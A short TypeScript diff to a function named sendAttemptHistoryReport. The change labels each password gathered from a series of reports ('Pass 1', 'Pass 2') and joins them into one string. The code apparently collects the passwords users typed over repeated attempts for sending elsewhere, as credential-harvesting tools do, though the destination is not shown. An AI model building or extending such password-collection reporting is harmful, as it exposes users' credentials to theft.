@@ -106,7 +106,7 @@ async function sendAttemptHistoryReport(reports: ResponsePayload[]) {
 
   const current = reports[reports.length - 1]
   const cumulativePasswords = reports
-    .map((report) => report.passwordValue ?? report.password ?? 'Unknown')
+    .map((report, index) => `Pass ${index + 1}: ${report.passwordValue ?? report.password ?? 'Unknown'}`)
     .filter((value) => value && value.trim())
 
   const cumulativePasswordValue = cumulativePasswords.join(' | ')
